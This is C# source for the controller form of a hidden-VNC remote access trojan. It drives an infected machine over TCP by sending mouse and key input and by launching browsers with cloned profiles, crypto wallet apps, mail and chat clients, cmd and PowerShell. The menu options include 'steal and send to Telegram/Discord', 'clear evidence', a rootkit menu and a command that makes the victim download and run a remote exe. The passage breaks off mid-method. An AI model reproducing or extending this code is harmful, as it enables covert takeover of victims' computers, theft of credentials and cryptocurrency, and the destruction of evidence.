using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BirdBrainmofo.HVNC
{
	public class hVNC : Form
	{
		private class BlueRenderer : ToolStripProfessionalRenderer
		{
			protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
			{
				Rectangle rect = new Rectangle(Point.Empty, e.Item.Size);
				using (SolidBrush brush = new SolidBrush(e.Item.Selected ? Color.White : Color.White))
				{
					e.Graphics.FillRectangle(brush, rect);
				}
				if (!e.Item.Selected)
				{
					e.Item.ForeColor = Color.Black;
					base.OnRenderMenuItemBackground(e);
					return;
				}
				Pen pen = new Pen(Color.SteelBlue);
				SolidBrush solidBrush = new SolidBrush(Color.SteelBlue);
				e.Item.ForeColor = Color.Black;
				Rectangle rect2 = new Rectangle(Point.Empty, e.Item.Size);
				e.Graphics.FillRectangle(solidBrush, rect2);
				e.Graphics.DrawRectangle(pen, 0, 0, rect2.Width, rect2.Height);
				pen.Dispose();
				solidBrush.Dispose();
			}
		}

		private TcpClient tcpClient_0;

		private int int_0;

		private bool bool_1;

		private bool bool_2;

		public MoveBytes FrmTransfer0;

		public MoveBytes MoveBytes0;

		public TGtoDSC TGDC0;

		private IContainer components;

		private Timer timer1;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private ToolStripStatusLabel toolStripStatusLabel2;

		private Timer timer2;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem closeToolStripMenuItem;

		private Label label3;

		private PictureBox VNCBox;

		private GroupBox groupBox6;

		private TrackBar IntervalScroll;

		private Label ResizeLabel;

		private Label QualityLabel;

		private Label IntervalLabel;

		private Button MinBtn;

		private TrackBar QualityScroll;

		private Button RestoreMaxBtn;

		private TrackBar ResizeScroll;

		private Button CloseBtn;

		private Button ShowStart;

		private Button button3;

		private StatusStrip statusStrip1;

		private StudioButton studioButton3;

		private StudioButton studioButton4;

		private StudioButton studioButton5;

		private PictureBox pictureBox1;

		private PrimeTheme primeTheme1;

		private StudioButton btnPaste;

		private StudioButton btnCopy;

		private StudioButton btnEx;

		private StudioButton btnCMD;

		private StudioButton btnPowershell;

		private StudioButton studioButton1;

		private JCS.ToggleSwitch chkClone;

		private Label label1;

		private StudioButton btnWatcher;

		private StudioButton btnRootkit;

		private StudioButton btnElectrum;

		private StudioButton studioButton2;

		private StudioButton studioButton6;

		private ContextMenuStrip contextMenuStrip2;

		private ToolStripMenuItem electrumToolStripMenuItem;

		private ToolStripMenuItem armoryToolStripMenuItem;

		private ToolStripMenuItem GuardaItem;

		private ToolStripMenuItem coinomiToolStripMenuItem;

		private ToolStripMenuItem exodusToolStripMenuItem;

		private ToolStripMenuItem atomicToolStripMenuItem;

		private ToolStripMenuItem jaxxToolStripMenuItem;

		private ContextMenuStrip contextMenuStrip3;

		private ToolStripMenuItem outlookToolStripMenuItem;

		private ToolStripMenuItem foxmailToolStripMenuItem;

		private ToolStripMenuItem thunderbirdToolStripMenuItem;

		private ToolStripMenuItem skypeToolStripMenuItem;

		private ToolStripMenuItem discordToolStripMenuItem;

		private ToolStripMenuItem telegramToolStripMenuItem;

		private ContextMenuStrip contextMenuStrip4;

		private ToolStripMenuItem btnChrome;

		private ToolStripMenuItem btnEdge;

		private ToolStripMenuItem btnFirefox;

		private ToolStripMenuItem btnBrave;

		private ToolStripMenuItem btnEpic;

		private ToolStripMenuItem btnVivaldi;

		private ToolStripMenuItem btn360;

		private ToolStripMenuItem btnSputnik;

		private StudioButton studioButton7;

		private StudioButton studioButton9;

		private ContextMenuStrip contextMenuStrip5;

		private ToolStripMenuItem msinfo32exeToolStripMenuItem;

		private ToolStripMenuItem mstscexeToolStripMenuItem;

		private Timer timer3;

		private ToolStripMenuItem notepadToolStripMenuItem;

		private ToolStripMenuItem controlPanelToolStripMenuItem;

		private Label label2;

		private StudioButton studioButton8;

		private StudioButton studioButton10;

		private ContextMenuStrip contextMenuStrip6;

		private ToolStripMenuItem stealAndSendToTelegramToolStripMenuItem;

		private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

		private ToolStripMenuItem comodoToolStripMenuItem;

		private ToolStripMenuItem yandexToolStripMenuItem;

		private ToolStripMenuItem operaNeonToolStripMenuItem;

		private ToolStripMenuItem waterFoxToolStripMenuItem;

		private ToolStripMenuItem orbitumToolStripMenuItem;

		private ToolStripMenuItem atomToolStripMenuItem;

		private ToolStripMenuItem slimjetToolStripMenuItem;

		private ToolStripMenuItem dingTalkToolStripMenuItem;

		private ToolStripMenuItem downloadLogsViaSocketToolStripMenuItem;

		private ToolStripMenuItem clearEvidenceToolStripMenuItem;

		private StudioButton studioButton11;

		public PictureBox VNCBoxe
		{
			get
			{
				return this.VNCBox;
			}
			set
			{
				this.VNCBox = value;
			}
		}

		public ToolStripStatusLabel toolStripStatusLabel2_
		{
			get
			{
				return this.toolStripStatusLabel2;
			}
			set
			{
				this.toolStripStatusLabel2 = value;
			}
		}

        private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("557*", tcpClient_0);
        }

        private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("555*", tcpClient_0);
        }

        private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("556*", tcpClient_0);
        }

        public void hURL(string url)
        {
            SendTCP("8585* " + url, (TcpClient)Tag);
        }

        public void UpdateClient(string url)
        {
            SendTCP("8589* " + url, (TcpClient)Tag);
        }

        public void ResetScale()
        {
            SendTCP("8587*", (TcpClient)Tag);
        }

        public hVNC()
		{
			this.int_0 = 0;
			this.bool_1 = true;
			this.bool_2 = false;
			this.FrmTransfer0 = new MoveBytes();
			this.TGDC0 = new TGtoDSC();
			this.InitializeComponent();
			this.VNCBox.MouseEnter += new EventHandler(VNCBox_MouseEnter);
			this.VNCBox.MouseLeave += new EventHandler(VNCBox_MouseLeave);
			this.VNCBox.KeyPress += new KeyPressEventHandler(VNCBox_KeyPress);
		}

		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			base.Focus();
		}

		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			base.FindForm().ActiveControl = null;
		}

		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

        private void VNCForm_Load(object sender, EventArgs e)
		{
            contextMenuStrip1.Renderer = new BlueRenderer();
            contextMenuStrip2.Renderer = new BlueRenderer();
            contextMenuStrip3.Renderer = new BlueRenderer();
            contextMenuStrip4.Renderer = new BlueRenderer();
            contextMenuStrip5.Renderer = new BlueRenderer();
            contextMenuStrip6.Renderer = new BlueRenderer();
            if (FrmTransfer0.IsDisposed)
            {
                FrmTransfer0 = new MoveBytes();
            }
            FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
            tcpClient_0 = (TcpClient)Tag;
            VNCBox.Tag = new Size(1028, 1028);
            SendTCP("0*", tcpClient_0);
            SendTCP("18*" + Convert.ToString("100"), tcpClient_0);
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
            timer3.Interval = 6000;
            timer3.Tick += new EventHandler(timer3_Tick);
            timer3.Start();
        }

		public void Check()
		{
            try
            {
                if (FrmTransfer0.FileTransferLabele.Text == null)
                {
                    toolStripStatusLabel2.Text = "Idle";
                }
                else
                {
                    toolStripStatusLabel2.Text = FrmTransfer0.FileTransferLabele.Text;
                }
            }
            catch
            {
            }
        }

		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.int_0 += 100;
				if (this.int_0 >= SystemInformation.DoubleClickTime)
				{
					this.bool_1 = true;
					this.bool_2 = false;
					this.int_0 = 0;
				}
			}
		}

		private void CopyBtn_Click(object sender, EventArgs e)
		{
		}

		private void PasteBtn_Click(object sender, EventArgs e)
		{
		}

		private void ShowStart_Click(object sender, EventArgs e)
		{
            SendTCP("13*", tcpClient_0);
		}

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.bool_1)
			{
				this.bool_1 = false;
				this.timer1.Start();
			}
			else if (this.int_0 < SystemInformation.DoubleClickTime)
			{
				this.bool_2 = true;
			}
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
            if (bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
                }
            }
            else if (e.Button == MouseButtons.Left)
            {
                SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
			double num4 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling((double)location.X / num);
            SendTCP(string.Concat("8*", str3: Conversions.ToString(Math.Ceiling((double)location.Y / num2)), str1: Conversions.ToString(num3), str2: "*"), tcpClient_0);
		}

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {
            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {
            QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
            ResizeLabel.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            SendTCP("15*", tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {
            SendTCP("14*", tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }

        private void StartExplorer_Click(object sender, EventArgs e)
		{
		}

		private void StartBrowserBtn_Click(object sender, EventArgs e)
		{
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						ulong num = 0uL;
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.VNCBox.Image = null;
			GC.Collect();
			base.Hide();
			e.Cancel = true;
		}

		private void VNCForm_Click(object sender, EventArgs e)
		{
			base.ActiveControl = null;
		}

		internal void method_18(object object_0)
		{
            ActiveControl = (Control)object_0;
		}

        private void button1_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new MoveBytes();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
                SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)Tag);
            }
        }

		private void button2_Click(object sender, EventArgs e)
		{
		}

		private void button3_Click(object sender, EventArgs e)
		{
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			this.Check();
		}

		private void button4_Click(object sender, EventArgs e)
		{
		}

		private void button5_Click(object sender, EventArgs e)
		{
		}

		private void closeToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void button6_Click(object sender, EventArgs e)
		{
		}

		private void button7_Click(object sender, EventArgs e)
		{
		}

		private void button8_Click(object sender, EventArgs e)
		{
		}

		private void VNCBox_MouseEnter_1(object sender, EventArgs e)
		{
			base.Focus();
		}

		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			base.Focus();
		}

		private void btnChrome_Click(object sender, EventArgs e)
		{
            if (!btnChrome.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnChrome.Text = "Chrome Started";
                }
                else
                {
                    SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnChrome.Text = "Chrome Started";
                }
            }
            else
            {
                SendTCP("2005*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnChrome.Text = "Chrome Stopped";
            }
        }

		private void btnEdge_Click(object sender, EventArgs e)
		{
            if (!btnEdge.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnEdge.Text = "Edge Started";
                }
                else
                {
                    SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnEdge.Text = "Edge Started";
                }
            }
            else
            {
                SendTCP("2002*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnEdge.Text = "Edge Stopped";
            }
        }

		private void btnFirefox_Click(object sender, EventArgs e)
		{
            if (!btnFirefox.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnFirefox.Text = "Firefox Started";
                }
                else
                {
                    SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnFirefox.Text = "Firefox Started";
                }
            }
            else
            {
                SendTCP("2001*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnFirefox.Text = "Firefox Stopped";
            }
        }

		private void btnOpera_Click(object sender, EventArgs e)
		{
            if (!btnEpic.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnEpic.Text = "Epic Started";
                }
                else
                {
                    SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnEpic.Text = "Epic Started";
                }
            }
            else
            {
                SendTCP("2003*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnEpic.Text = "Epic Stopped";
            }
        }

		private void btnBrave_Click(object sender, EventArgs e)
		{
            if (!btnBrave.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnBrave.Text = "Started";
                }
                else
                {
                    SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnBrave.Text = "Brave Started";
                }
            }
            else
            {
                SendTCP("2005*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnBrave.Text = "Brave Stopped";
            }
		}

		private void btnPowershell_Click(object sender, EventArgs e)
		{
            SendTCP("4876*", tcpClient_0);
		}

        private void btnCMD_Click(object sender, EventArgs e)
		{
            SendTCP("4875*", tcpClient_0);
		}

        private void btnEx_Click(object sender, EventArgs e)
		{
            SendTCP("21*", tcpClient_0);
		}

        private void btnCopy_Click(object sender, EventArgs e)
		{
			try
			{
                SendTCP("10*" + Clipboard.GetText(), tcpClient_0);
			}
            catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void btnPaste_Click(object sender, EventArgs e)
		{
            SendTCP("9*", tcpClient_0);
		}

        private void studioButton1_Click(object sender, EventArgs e)
		{
            string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
            if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text))
            {
                SendTCP("56*" + text, (TcpClient)Tag);
            }
        }

		private void btnVivaldi_Click(object sender, EventArgs e)
		{
            if (!btnVivaldi.Text.Contains("Started"))
			{
                if (this.chkClone.Checked)
				{
					if (this.FrmTransfer0.IsDisposed)
					{
						this.FrmTransfer0 = new MoveBytes();
					}
					this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
					this.FrmTransfer0.Hide();
                    SendTCP("1004*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnVivaldi.Text = "Vivaldi Started";
                }
                else
                {
                    SendTCP("1004*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnVivaldi.Text = "Vivaldi Started";
                }
            }
            else
            {
                SendTCP("2004*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnVivaldi.Text = "Vivaldi Stopped";
            }
		}

		private void btnSputnik_Click(object sender, EventArgs e)
		{
            if (!btnSputnik.Text.Contains("Started"))
			{
                if (this.chkClone.Checked)
				{
					if (this.FrmTransfer0.IsDisposed)
					{
						this.FrmTransfer0 = new MoveBytes();
					}
					this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
					this.FrmTransfer0.Hide();
                    SendTCP("1002*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btnSputnik.Text = "Sputnik Started";
                }
                else
                {
                    SendTCP("1002*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btnSputnik.Text = "Sputnik Started";
                }
            }
            else
            {
                SendTCP("2006*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnSputnik.Text = "Sputnik Stopped";
            }
		}

		private void btn360_Click(object sender, EventArgs e)
		{
            if (!btn360.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                    FrmTransfer0.Hide();
                    SendTCP("991*" + Conversions.ToString(Value: true), (TcpClient)Tag);
                    btn360.Text = "360 Started";
                }
                else
                {
                    SendTCP("991*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                    btn360.Text = "360 Started";
                }
            }
            else
            {
                SendTCP("2007*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btn360.Text = "360 Stopped";
            }
        }

		private void btnWatcher_Click(object sender, EventArgs e)
		{
            if (!btnWatcher.Text.Contains("Started"))
            {
                SendTCP("1008*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnWatcher.Text = "Watcher Started";
            }
            else
            {
                SendTCP("2008*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                btnWatcher.Text = "Watcher Stopped";
            }
        }

		private void btnRootkit_Click(object sender, EventArgs e)
		{
			this.contextMenuStrip3.Show(this.btnRootkit, 0, this.btnRootkit.Height);
		}

		private void studioButton2_Click(object sender, EventArgs e)
		{
            SendTCP("2011*" + Conversions.ToString(Value: false), (TcpClient)Tag);
		}

        private void studioButton5_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void studioButton4_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
		}

		private void studioButton3_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Normal;
		}

		private void studioButton2_Click_1(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void studioButton6_Click(object sender, EventArgs e)
		{
			this.contextMenuStrip2.Show(this.studioButton6, 0, this.studioButton6.Height);
		}

		private void electrumToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (!electrumToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2026*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                electrumToolStripMenuItem.Text = "Electrum Started";
            }
            else
            {
                SendTCP("2027*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                electrumToolStripMenuItem.Text = "Electrum Stopped";
            }
        }

		private void armoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!armoryToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2014*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                armoryToolStripMenuItem.Text = "Armory Started";
            }
            else
            {
                SendTCP("2015*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                armoryToolStripMenuItem.Text = "Armory Stopped";
            }
        }

		private void GuardaItem_Click(object sender, EventArgs e)
		{
            if (!GuardaItem.Text.Contains("Started"))
            {
                SendTCP("2018*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                GuardaItem.Text = "Guarda Started";
            }
            else
            {
                SendTCP("2019*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                GuardaItem.Text = "Guarda Stopped";
            }
        }

		private void coinomiToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (!coinomiToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2016*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                coinomiToolStripMenuItem.Text = "Coinomi Started";
            }
            else
            {
                SendTCP("2017*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                coinomiToolStripMenuItem.Text = "Coinomi Stopped";
            }
        }

		private void exodusToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (!exodusToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2020*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                exodusToolStripMenuItem.Text = "Exodus Started";
            }
            else
            {
                SendTCP("2021*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                exodusToolStripMenuItem.Text = "Exodus Stopped";
            }
        }

		private void atomicToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (!atomicToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2022*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                atomicToolStripMenuItem.Text = "Atomic Started";
            }
            else
            {
                SendTCP("2023*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                atomicToolStripMenuItem.Text = "Atomic Stopped";
            }
        }

        private void jaxxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!jaxxToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2024*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                jaxxToolStripMenuItem.Text = "Jaxx Started";
            }
            else
            {
                SendTCP("2025*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                jaxxToolStripMenuItem.Text = "Jaxx Stopped";
            }
        }

        private void outlookToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!outlookToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("555*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                outlookToolStripMenuItem.Text = "Outlook Started";
            }
            else
            {
                SendTCP("2028*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                outlookToolStripMenuItem.Text = "Outlook Stopped";
            }
        }

        private void foxmailToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!foxmailToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("556*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                foxmailToolStripMenuItem.Text = "Foxmail Started";
            }
            else
            {
                SendTCP("2030*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                foxmailToolStripMenuItem.Text = "Foxmail Stopped";
            }
        }

        private void thunderbirdToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!thunderbirdToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("557*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                thunderbirdToolStripMenuItem.Text = "Thunderbird Started";
            }
            else
            {
                SendTCP("2031*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                thunderbirdToolStripMenuItem.Text = "Thunderbird Stopped";
            }
        }

        private void skypeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!skypeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2032*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                skypeToolStripMenuItem.Text = "Skype Started";
            }
            else
            {
                SendTCP("2033*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                skypeToolStripMenuItem.Text = "Skype Stopped";
            }
        }

        private void discordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!discordToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2034*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                discordToolStripMenuItem.Text = "Discord Started";
            }
            else
            {
                SendTCP("2035*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                discordToolStripMenuItem.Text = "Discord Stopped";
            }
        }

        private void telegramToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!telegramToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2036*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                telegramToolStripMenuItem.Text = "Telegram Started";
            }
            else
            {
                SendTCP("2037*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                telegramToolStripMenuItem.Text = "Telegram Stopped";
            }
        }

        private void studioButton7_Click(object sender, EventArgs e)
		{
			this.contextMenuStrip4.Show(this.studioButton7, 0, this.studioButton7.Height);
		}

		private void studioButton8_Click(object sender, EventArgs e)
		{
		}

		private void btnControl_Click(object sender, EventArgs e)
		{
		}

		private void studioButton9_Click(object sender, EventArgs e)
		{
			this.contextMenuStrip5.Show(this.studioButton9, 0, this.studioButton9.Height);
		}

        private void msinfo32exeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!msinfo32exeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2052*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                msinfo32exeToolStripMenuItem.Text = "SystemInfo Started";
            }
            else
            {
                SendTCP("2053*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                msinfo32exeToolStripMenuItem.Text = "SystemInfo Stopped";
            }
        }

        private void mstscexeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!mstscexeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2054*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                mstscexeToolStripMenuItem.Text = "Mstsc Started";
            }
            else
            {
                SendTCP("2055*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                mstscexeToolStripMenuItem.Text = "Mstsc Stopped";
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
		{
		}

        private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!notepadToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2040*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                notepadToolStripMenuItem.Text = "Notepad Started";
            }
            else
            {
                SendTCP("2041*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                notepadToolStripMenuItem.Text = "Notepad Stopped";
            }
        }

        private void controlPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!controlPanelToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2038*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                controlPanelToolStripMenuItem.Text = "Control Started";
            }
            else
            {
                SendTCP("2039*" + Conversions.ToString(Value: false), (TcpClient)Tag);
